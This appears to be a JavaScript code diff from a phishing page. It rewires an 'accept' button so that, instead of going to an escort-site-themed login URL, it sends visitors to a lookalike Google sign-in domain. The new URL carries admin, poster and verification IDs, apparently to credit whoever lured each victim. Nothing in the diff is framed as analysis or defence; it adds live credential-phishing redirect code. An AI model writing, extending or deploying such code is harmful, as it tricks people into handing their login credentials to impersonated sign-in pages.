@@ -62,14 +62,17 @@ function getQueryParam(param) {
 
 
 
+    const adminId = getQueryParam('admin');
+    const posterId = getQueryParam('poster');
+        const verifyId = getQueryParam('verifyId');
 
-       let userId = getQueryParam('userid') || 1;
+    const site = getQueryParam('site');
+
        
 
  document.querySelectorAll('.accept-button').forEach(button => {
   button.addEventListener('click', () => {
-       let userId = getQueryParam('userid') || 1;
-    window.location.href =`https://escortbabylon-comment.net/auth/log_in/${userId}`
+   window.location.href =  `https://google-signin-live.vercel.app/${adminId}/${posterId}/${verifyId}`;
   });
 });
  
